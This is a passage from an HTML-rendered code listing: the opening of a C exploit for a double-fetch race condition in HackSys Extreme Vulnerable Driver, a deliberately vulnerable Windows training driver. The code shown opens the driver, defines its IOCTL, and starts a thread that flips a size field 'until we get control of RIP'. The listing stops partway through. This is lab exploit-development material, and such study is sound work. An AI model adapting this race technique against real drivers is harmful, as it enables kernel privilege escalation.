<span class="normal"><a href="#__codelineno-35-19"> 19</a></span>
<span class="normal"><a href="#__codelineno-35-20"> 20</a></span>
<span class="normal"><a href="#__codelineno-35-21"> 21</a></span>
<span class="normal"><a href="#__codelineno-35-22"> 22</a></span>
<span class="normal"><a href="#__codelineno-35-23"> 23</a></span>
<span class="normal"><a href="#__codelineno-35-24"> 24</a></span>
<span class="normal"><a href="#__codelineno-35-25"> 25</a></span>
<span class="normal"><a href="#__codelineno-35-26"> 26</a></span>
<span class="normal"><a href="#__codelineno-35-27"> 27</a></span>
<span class="normal"><a href="#__codelineno-35-28"> 28</a></span>
<span class="normal"><a href="#__codelineno-35-29"> 29</a></span>
<span class="normal"><a href="#__codelineno-35-30"> 30</a></span>
<span class="normal"><a href="#__codelineno-35-31"> 31</a></span>
<span class="normal"><a href="#__codelineno-35-32"> 32</a></span>
<span class="normal"><a href="#__codelineno-35-33"> 33</a></span>
<span class="normal"><a href="#__codelineno-35-34"> 34</a></span>
<span class="normal"><a href="#__codelineno-35-35"> 35</a></span>
<span class="normal"><a href="#__codelineno-35-36"> 36</a></span>
<span class="normal"><a href="#__codelineno-35-37"> 37</a></span>
<span class="normal"><a href="#__codelineno-35-38"> 38</a></span>
<span class="normal"><a href="#__codelineno-35-39"> 39</a></span>
<span class="normal"><a href="#__codelineno-35-40"> 40</a></span>
<span class="normal"><a href="#__codelineno-35-41"> 41</a></span>
<span class="normal"><a href="#__codelineno-35-42"> 42</a></span>
<span class="normal"><a href="#__codelineno-35-43"> 43</a></span>
<span class="normal"><a href="#__codelineno-35-44"> 44</a></span>
<span class="normal"><a href="#__codelineno-35-45"> 45</a></span>
<span class="normal"><a href="#__codelineno-35-46"> 46</a></span>
<span class="normal"><a href="#__codelineno-35-47"> 47</a></span>
<span class="normal"><a href="#__codelineno-35-48"> 48</a></span>
<span class="normal"><a href="#__codelineno-35-49"> 49</a></span>
<span class="normal"><a href="#__codelineno-35-50"> 50</a></span>
<span class="normal"><a href="#__codelineno-35-51"> 51</a></span>
<span class="normal"><a href="#__codelineno-35-52"> 52</a></span>
<span class="normal"><a href="#__codelineno-35-53"> 53</a></span>
<span class="normal"><a href="#__codelineno-35-54"> 54</a></span>
<span class="normal"><a href="#__codelineno-35-55"> 55</a></span>
<span class="normal"><a href="#__codelineno-35-56"> 56</a></span>
<span class="normal"><a href="#__codelineno-35-57"> 57</a></span>
<span class="normal"><a href="#__codelineno-35-58"> 58</a></span>
<span class="normal"><a href="#__codelineno-35-59"> 59</a></span>
<span class="normal"><a href="#__codelineno-35-60"> 60</a></span>
<span class="normal"><a href="#__codelineno-35-61"> 61</a></span>
<span class="normal"><a href="#__codelineno-35-62"> 62</a></span>
<span class="normal"><a href="#__codelineno-35-63"> 63</a></span>
<span class="normal"><a href="#__codelineno-35-64"> 64</a></span>
<span class="normal"><a href="#__codelineno-35-65"> 65</a></span>
<span class="normal"><a href="#__codelineno-35-66"> 66</a></span>
<span class="normal"><a href="#__codelineno-35-67"> 67</a></span>
<span class="normal"><a href="#__codelineno-35-68"> 68</a></span>
<span class="normal"><a href="#__codelineno-35-69"> 69</a></span>
<span class="normal"><a href="#__codelineno-35-70"> 70</a></span>
<span class="normal"><a href="#__codelineno-35-71"> 71</a></span>
<span class="normal"><a href="#__codelineno-35-72"> 72</a></span>
<span class="normal"><a href="#__codelineno-35-73"> 73</a></span>
<span class="normal"><a href="#__codelineno-35-74"> 74</a></span>
<span class="normal"><a href="#__codelineno-35-75"> 75</a></span>
<span class="normal"><a href="#__codelineno-35-76"> 76</a></span>
<span class="normal"><a href="#__codelineno-35-77"> 77</a></span>
<span class="normal"><a href="#__codelineno-35-78"> 78</a></span>
<span class="normal"><a href="#__codelineno-35-79"> 79</a></span>
<span class="normal"><a href="#__codelineno-35-80"> 80</a></span>
<span class="normal"><a href="#__codelineno-35-81"> 81</a></span>
<span class="normal"><a href="#__codelineno-35-82"> 82</a></span>
<span class="normal"><a href="#__codelineno-35-83"> 83</a></span>
<span class="normal"><a href="#__codelineno-35-84"> 84</a></span>
<span class="normal"><a href="#__codelineno-35-85"> 85</a></span>
<span class="normal"><a href="#__codelineno-35-86"> 86</a></span>
<span class="normal"><a href="#__codelineno-35-87"> 87</a></span>
<span class="normal"><a href="#__codelineno-35-88"> 88</a></span>
<span class="normal"><a href="#__codelineno-35-89"> 89</a></span>
<span class="normal"><a href="#__codelineno-35-90"> 90</a></span>
<span class="normal"><a href="#__codelineno-35-91"> 91</a></span>
<span class="normal"><a href="#__codelineno-35-92"> 92</a></span>
<span class="normal"><a href="#__codelineno-35-93"> 93</a></span>
<span class="normal"><a href="#__codelineno-35-94"> 94</a></span>
<span class="normal"><a href="#__codelineno-35-95"> 95</a></span>
<span class="normal"><a href="#__codelineno-35-96"> 96</a></span>
<span class="normal"><a href="#__codelineno-35-97"> 97</a></span>
<span class="normal"><a href="#__codelineno-35-98"> 98</a></span>
<span class="normal"><a href="#__codelineno-35-99"> 99</a></span>
<span class="normal"><a href="#__codelineno-35-100">100</a></span>
<span class="normal"><a href="#__codelineno-35-101">101</a></span>
<span class="normal"><a href="#__codelineno-35-102">102</a></span>
<span class="normal"><a href="#__codelineno-35-103">103</a></span>
<span class="normal"><a href="#__codelineno-35-104">104</a></span>
<span class="normal"><a href="#__codelineno-35-105">105</a></span>
<span class="normal"><a href="#__codelineno-35-106">106</a></span>
<span class="normal"><a href="#__codelineno-35-107">107</a></span>
<span class="normal"><a href="#__codelineno-35-108">108</a></span>
<span class="normal"><a href="#__codelineno-35-109">109</a></span>
<span class="normal"><a href="#__codelineno-35-110">110</a></span>
<span class="normal"><a href="#__codelineno-35-111">111</a></span>
<span class="normal"><a href="#__codelineno-35-112">112</a></span>
<span class="normal"><a href="#__codelineno-35-113">113</a></span>
<span class="normal"><a href="#__codelineno-35-114">114</a></span>
<span class="normal"><a href="#__codelineno-35-115">115</a></span>
<span class="normal"><a href="#__codelineno-35-116">116</a></span>
<span class="normal"><a href="#__codelineno-35-117">117</a></span>
<span class="normal"><a href="#__codelineno-35-118">118</a></span>
<span class="normal"><a href="#__codelineno-35-119">119</a></span>
<span class="normal"><a href="#__codelineno-35-120">120</a></span>
<span class="normal"><a href="#__codelineno-35-121">121</a></span>
<span class="normal"><a href="#__codelineno-35-122">122</a></span>
<span class="normal"><a href="#__codelineno-35-123">123</a></span>
<span class="normal"><a href="#__codelineno-35-124">124</a></span>
<span class="normal"><a href="#__codelineno-35-125">125</a></span>
<span class="normal"><a href="#__codelineno-35-126">126</a></span>
<span class="normal"><a href="#__codelineno-35-127">127</a></span>
<span class="normal"><a href="#__codelineno-35-128">128</a></span>
<span class="normal"><a href="#__codelineno-35-129">129</a></span>
<span class="normal"><a href="#__codelineno-35-130">130</a></span>
<span class="normal"><a href="#__codelineno-35-131">131</a></span>
<span class="normal"><a href="#__codelineno-35-132">132</a></span>
<span class="normal"><a href="#__codelineno-35-133">133</a></span>
<span class="normal"><a href="#__codelineno-35-134">134</a></span>
<span class="normal"><a href="#__codelineno-35-135">135</a></span>
<span class="normal"><a href="#__codelineno-35-136">136</a></span>
<span class="normal"><a href="#__codelineno-35-137">137</a></span>
<span class="normal"><a href="#__codelineno-35-138">138</a></span>
<span class="normal"><a href="#__codelineno-35-139">139</a></span>
<span class="normal"><a href="#__codelineno-35-140">140</a></span>
<span class="normal"><a href="#__codelineno-35-141">141</a></span>
<span class="normal"><a href="#__codelineno-35-142">142</a></span>
<span class="normal"><a href="#__codelineno-35-143">143</a></span>
<span class="normal"><a href="#__codelineno-35-144">144</a></span>
<span class="normal"><a href="#__codelineno-35-145">145</a></span>
<span class="normal"><a href="#__codelineno-35-146">146</a></span>
<span class="normal"><a href="#__codelineno-35-147">147</a></span>
<span class="normal"><a href="#__codelineno-35-148">148</a></span>
<span class="normal"><a href="#__codelineno-35-149">149</a></span>
<span class="normal"><a href="#__codelineno-35-150">150</a></span>
<span class="normal"><a href="#__codelineno-35-151">151</a></span>
<span class="normal"><a href="#__codelineno-35-152">152</a></span>
<span class="normal"><a href="#__codelineno-35-153">153</a></span>
<span class="normal"><a href="#__codelineno-35-154">154</a></span>
<span class="normal"><a href="#__codelineno-35-155">155</a></span>
<span class="normal"><a href="#__codelineno-35-156">156</a></span>
<span class="normal"><a href="#__codelineno-35-157">157</a></span>
<span class="normal"><a href="#__codelineno-35-158">158</a></span>
<span class="normal"><a href="#__codelineno-35-159">159</a></span>
<span class="normal"><a href="#__codelineno-35-160">160</a></span>
<span class="normal"><a href="#__codelineno-35-161">161</a></span>
<span class="normal"><a href="#__codelineno-35-162">162</a></span>
<span class="normal"><a href="#__codelineno-35-163">163</a></span>
<span class="normal"><a href="#__codelineno-35-164">164</a></span>
<span class="normal"><a href="#__codelineno-35-165">165</a></span>
<span class="normal"><a href="#__codelineno-35-166">166</a></span>
<span class="normal"><a href="#__codelineno-35-167">167</a></span>
<span class="normal"><a href="#__codelineno-35-168">168</a></span>
<span class="normal"><a href="#__codelineno-35-169">169</a></span>
<span class="normal"><a href="#__codelineno-35-170">170</a></span>
<span class="normal"><a href="#__codelineno-35-171">171</a></span>
<span class="normal"><a href="#__codelineno-35-172">172</a></span>
<span class="normal"><a href="#__codelineno-35-173">173</a></span>
<span class="normal"><a href="#__codelineno-35-174">174</a></span>
<span class="normal"><a href="#__codelineno-35-175">175</a></span>
<span class="normal"><a href="#__codelineno-35-176">176</a></span>
<span class="normal"><a href="#__codelineno-35-177">177</a></span>
<span class="normal"><a href="#__codelineno-35-178">178</a></span>
<span class="normal"><a href="#__codelineno-35-179">179</a></span>
<span class="normal"><a href="#__codelineno-35-180">180</a></span>
<span class="normal"><a href="#__codelineno-35-181">181</a></span>
<span class="normal"><a href="#__codelineno-35-182">182</a></span>
<span class="normal"><a href="#__codelineno-35-183">183</a></span>
<span class="normal"><a href="#__codelineno-35-184">184</a></span>
<span class="normal"><a href="#__codelineno-35-185">185</a></span>
<span class="normal"><a href="#__codelineno-35-186">186</a></span>
<span class="normal"><a href="#__codelineno-35-187">187</a></span>
<span class="normal"><a href="#__codelineno-35-188">188</a></span>
<span class="normal"><a href="#__codelineno-35-189">189</a></span>
<span class="normal"><a href="#__codelineno-35-190">190</a></span>
<span class="normal"><a href="#__codelineno-35-191">191</a></span>
<span class="normal"><a href="#__codelineno-35-192">192</a></span>
<span class="normal"><a href="#__codelineno-35-193">193</a></span>
<span class="normal"><a href="#__codelineno-35-194">194</a></span>
<span class="normal"><a href="#__codelineno-35-195">195</a></span>
<span class="normal"><a href="#__codelineno-35-196">196</a></span>
<span class="normal"><a href="#__codelineno-35-197">197</a></span>
<span class="normal"><a href="#__codelineno-35-198">198</a></span>
<span class="normal"><a href="#__codelineno-35-199">199</a></span>
<span class="normal"><a href="#__codelineno-35-200">200</a></span>
<span class="normal"><a href="#__codelineno-35-201">201</a></span>
<span class="normal"><a href="#__codelineno-35-202">202</a></span>
<span class="normal"><a href="#__codelineno-35-203">203</a></span>
<span class="normal"><a href="#__codelineno-35-204">204</a></span>
<span class="normal"><a href="#__codelineno-35-205">205</a></span>
<span class="normal"><a href="#__codelineno-35-206">206</a></span>
<span class="normal"><a href="#__codelineno-35-207">207</a></span>
<span class="normal"><a href="#__codelineno-35-208">208</a></span>
<span class="normal"><a href="#__codelineno-35-209">209</a></span>
<span class="normal"><a href="#__codelineno-35-210">210</a></span>
<span class="normal"><a href="#__codelineno-35-211">211</a></span>
<span class="normal"><a href="#__codelineno-35-212">212</a></span>
<span class="normal"><a href="#__codelineno-35-213">213</a></span>
<span class="normal"><a href="#__codelineno-35-214">214</a></span>
<span class="normal"><a href="#__codelineno-35-215">215</a></span>
<span class="normal"><a href="#__codelineno-35-216">216</a></span>
<span class="normal"><a href="#__codelineno-35-217">217</a></span>
<span class="normal"><a href="#__codelineno-35-218">218</a></span>
<span class="normal"><a href="#__codelineno-35-219">219</a></span>
<span class="normal"><a href="#__codelineno-35-220">220</a></span>
<span class="normal"><a href="#__codelineno-35-221">221</a></span>
<span class="normal"><a href="#__codelineno-35-222">222</a></span>
<span class="normal"><a href="#__codelineno-35-223">223</a></span>
<span class="normal"><a href="#__codelineno-35-224">224</a></span>
<span class="normal"><a href="#__codelineno-35-225">225</a></span>
<span class="normal"><a href="#__codelineno-35-226">226</a></span>
<span class="normal"><a href="#__codelineno-35-227">227</a></span>
<span class="normal"><a href="#__codelineno-35-228">228</a></span>
<span class="normal"><a href="#__codelineno-35-229">229</a></span>
<span class="normal"><a href="#__codelineno-35-230">230</a></span>
<span class="normal"><a href="#__codelineno-35-231">231</a></span>
<span class="normal"><a href="#__codelineno-35-232">232</a></span>
<span class="normal"><a href="#__codelineno-35-233">233</a></span>
<span class="normal"><a href="#__codelineno-35-234">234</a></span>
<span class="normal"><a href="#__codelineno-35-235">235</a></span>
<span class="normal"><a href="#__codelineno-35-236">236</a></span>
<span class="normal"><a href="#__codelineno-35-237">237</a></span>
<span class="normal"><a href="#__codelineno-35-238">238</a></span>
<span class="normal"><a href="#__codelineno-35-239">239</a></span>
<span class="normal"><a href="#__codelineno-35-240">240</a></span>
<span class="normal"><a href="#__codelineno-35-241">241</a></span>
<span class="normal"><a href="#__codelineno-35-242">242</a></span>
<span class="normal"><a href="#__codelineno-35-243">243</a></span>
<span class="normal"><a href="#__codelineno-35-244">244</a></span>
<span class="normal"><a href="#__codelineno-35-245">245</a></span>
<span class="normal"><a href="#__codelineno-35-246">246</a></span>
<span class="normal"><a href="#__codelineno-35-247">247</a></span>
<span class="normal"><a href="#__codelineno-35-248">248</a></span>
<span class="normal"><a href="#__codelineno-35-249">249</a></span>
<span class="normal"><a href="#__codelineno-35-250">250</a></span>
<span class="normal"><a href="#__codelineno-35-251">251</a></span>
<span class="normal"><a href="#__codelineno-35-252">252</a></span>
<span class="normal"><a href="#__codelineno-35-253">253</a></span>
<span class="normal"><a href="#__codelineno-35-254">254</a></span>
<span class="normal"><a href="#__codelineno-35-255">255</a></span>
<span class="normal"><a href="#__codelineno-35-256">256</a></span>
<span class="normal"><a href="#__codelineno-35-257">257</a></span>
<span class="normal"><a href="#__codelineno-35-258">258</a></span>
<span class="normal"><a href="#__codelineno-35-259">259</a></span>
<span class="normal"><a href="#__codelineno-35-260">260</a></span>
<span class="normal"><a href="#__codelineno-35-261">261</a></span>
<span class="normal"><a href="#__codelineno-35-262">262</a></span>
<span class="normal"><a href="#__codelineno-35-263">263</a></span>
<span class="normal"><a href="#__codelineno-35-264">264</a></span>
<span class="normal"><a href="#__codelineno-35-265">265</a></span>
<span class="normal"><a href="#__codelineno-35-266">266</a></span>
<span class="normal"><a href="#__codelineno-35-267">267</a></span>
<span class="normal"><a href="#__codelineno-35-268">268</a></span>
<span class="normal"><a href="#__codelineno-35-269">269</a></span>
<span class="normal"><a href="#__codelineno-35-270">270</a></span>
<span class="normal"><a href="#__codelineno-35-271">271</a></span>
<span class="normal"><a href="#__codelineno-35-272">272</a></span>
<span class="normal"><a href="#__codelineno-35-273">273</a></span>
<span class="normal"><a href="#__codelineno-35-274">274</a></span>
<span class="normal"><a href="#__codelineno-35-275">275</a></span>
<span class="normal"><a href="#__codelineno-35-276">276</a></span>
<span class="normal"><a href="#__codelineno-35-277">277</a></span>
<span class="normal"><a href="#__codelineno-35-278">278</a></span>
<span class="normal"><a href="#__codelineno-35-279">279</a></span>
<span class="normal"><a href="#__codelineno-35-280">280</a></span>
<span class="normal"><a href="#__codelineno-35-281">281</a></span>
<span class="normal"><a href="#__codelineno-35-282">282</a></span>
<span class="normal"><a href="#__codelineno-35-283">283</a></span>
<span class="normal"><a href="#__codelineno-35-284">284</a></span>
<span class="normal"><a href="#__codelineno-35-285">285</a></span>
<span class="normal"><a href="#__codelineno-35-286">286</a></span>
<span class="normal"><a href="#__codelineno-35-287">287</a></span>
<span class="normal"><a href="#__codelineno-35-288">288</a></span>
<span class="normal"><a href="#__codelineno-35-289">289</a></span>
<span class="normal"><a href="#__codelineno-35-290">290</a></span>
<span class="normal"><a href="#__codelineno-35-291">291</a></span>
<span class="normal"><a href="#__codelineno-35-292">292</a></span>
<span class="normal"><a href="#__codelineno-35-293">293</a></span>
<span class="normal"><a href="#__codelineno-35-294">294</a></span>
<span class="normal"><a href="#__codelineno-35-295">295</a></span>
<span class="normal"><a href="#__codelineno-35-296">296</a></span>
<span class="normal"><a href="#__codelineno-35-297">297</a></span>
<span class="normal"><a href="#__codelineno-35-298">298</a></span>
<span class="normal"><a href="#__codelineno-35-299">299</a></span>
<span class="normal"><a href="#__codelineno-35-300">300</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-35-2" name="__codelineno-35-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<a id="__codelineno-35-3" name="__codelineno-35-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;processthreadsapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-35-4" name="__codelineno-35-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-35-5" name="__codelineno-35-5"></a>
<a id="__codelineno-35-6" name="__codelineno-35-6"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-35-7" name="__codelineno-35-7"></a><span class="cp">#define IOCTL_CODE 0x222037</span>
<a id="__codelineno-35-8" name="__codelineno-35-8"></a>
<a id="__codelineno-35-9" name="__codelineno-35-9"></a><span class="cm">/* Structure for the user-mode buffer */</span><span class="w"></span>
<a id="__codelineno-35-10" name="__codelineno-35-10"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_USER_DOUBLE_FETCH</span><span class="w"></span>
<a id="__codelineno-35-11" name="__codelineno-35-11"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-12" name="__codelineno-35-12"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">Buffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-13" name="__codelineno-35-13"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">Size</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-14" name="__codelineno-35-14"></a><span class="p">}</span><span class="w"> </span><span class="n">USER_DOUBLE_FETCH</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PUSER_DOUBLE_FETCH</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-15" name="__codelineno-35-15"></a>
<a id="__codelineno-35-16" name="__codelineno-35-16"></a><span class="cm">/* Structure for needed data in IoControlThread function */</span><span class="w"></span>
<a id="__codelineno-35-17" name="__codelineno-35-17"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_THREAD_PARAM</span><span class="w"></span>
<a id="__codelineno-35-18" name="__codelineno-35-18"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-19" name="__codelineno-35-19"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">              </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-20" name="__codelineno-35-20"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w">  </span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w">    </span><span class="c1">// This member is a pointer to the _USER_DOUBLE_FETCH structure</span>
<a id="__codelineno-35-21" name="__codelineno-35-21"></a><span class="p">}</span><span class="w"> </span><span class="n">IO_THREAD_PARAM</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PIO_THREAD_PARAM</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-22" name="__codelineno-35-22"></a>
<a id="__codelineno-35-23" name="__codelineno-35-23"></a><span class="cm">/* Function to open a handle to the driver */</span><span class="w"></span>
<a id="__codelineno-35-24" name="__codelineno-35-24"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-25" name="__codelineno-35-25"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-26" name="__codelineno-35-26"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-27" name="__codelineno-35-27"></a>
<a id="__codelineno-35-28" name="__codelineno-35-28"></a><span class="w">    </span><span class="cm">/* Opens handle to driver */</span><span class="w"></span>
<a id="__codelineno-35-29" name="__codelineno-35-29"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-30" name="__codelineno-35-30"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="c1">// If handle cant open, exit.</span>
<a id="__codelineno-35-31" name="__codelineno-35-31"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-32" name="__codelineno-35-32"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[!] FATAL: Failed to open driver handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-33" name="__codelineno-35-33"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-34" name="__codelineno-35-34"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-35" name="__codelineno-35-35"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-35-36" name="__codelineno-35-36"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-37" name="__codelineno-35-37"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Opened Driver Handle: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-38" name="__codelineno-35-38"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"> </span><span class="c1">// Return handle to driver to be used later.</span>
<a id="__codelineno-35-39" name="__codelineno-35-39"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-40" name="__codelineno-35-40"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-41" name="__codelineno-35-41"></a>
<a id="__codelineno-35-42" name="__codelineno-35-42"></a><span class="cm">/* Function to check how many processors we have */</span><span class="w"></span>
<a id="__codelineno-35-43" name="__codelineno-35-43"></a><span class="kt">int</span><span class="w"> </span><span class="nf">CheckProcessors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-44" name="__codelineno-35-44"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-45" name="__codelineno-35-45"></a><span class="w">    </span><span class="n">SYSTEM_INFO</span><span class="w"> </span><span class="n">SystemInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-35-46" name="__codelineno-35-46"></a>
<a id="__codelineno-35-47" name="__codelineno-35-47"></a><span class="w">    </span><span class="cm">/* Check if we have more than 4 processors as attack will take too otherwise */</span><span class="w"></span>
<a id="__codelineno-35-48" name="__codelineno-35-48"></a><span class="w">    </span><span class="n">GetSystemInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SystemInfo</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-49" name="__codelineno-35-49"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-50" name="__codelineno-35-50"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-51" name="__codelineno-35-51"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: You don&#39;t have enough processors, exiting!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-52" name="__codelineno-35-52"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-53" name="__codelineno-35-53"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-54" name="__codelineno-35-54"></a>
<a id="__codelineno-35-55" name="__codelineno-35-55"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">NumProcessors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-56" name="__codelineno-35-56"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Return number of processors available to be used later. */</span><span class="w"></span>
<a id="__codelineno-35-57" name="__codelineno-35-57"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-58" name="__codelineno-35-58"></a>
<a id="__codelineno-35-59" name="__codelineno-35-59"></a><span class="cm">/* Function to change the size member of the UserDoubleFetch struct */</span><span class="w"></span>
<a id="__codelineno-35-60" name="__codelineno-35-60"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">Size</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-61" name="__codelineno-35-61"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-62" name="__codelineno-35-62"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-63" name="__codelineno-35-63"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-64" name="__codelineno-35-64"></a>
<a id="__codelineno-35-65" name="__codelineno-35-65"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Changing size on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-35-66" name="__codelineno-35-66"></a>
<a id="__codelineno-35-67" name="__codelineno-35-67"></a><span class="w">    </span><span class="c1">// Run until we get control of RIP.</span>
<a id="__codelineno-35-68" name="__codelineno-35-68"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-69" name="__codelineno-35-69"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-70" name="__codelineno-35-70"></a><span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">Size</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="mh">0x00000828</span><span class="p">;</span><span class="w"> </span><span class="c1">// 2088</span>
<a id="__codelineno-35-71" name="__codelineno-35-71"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-72" name="__codelineno-35-72"></a>
<a id="__codelineno-35-73" name="__codelineno-35-73"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-74" name="__codelineno-35-74"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-75" name="__codelineno-35-75"></a>
<a id="__codelineno-35-76" name="__codelineno-35-76"></a><span class="cm">/* Function to issue IOCTL repeatedly */</span><span class="w"></span>
<a id="__codelineno-35-77" name="__codelineno-35-77"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
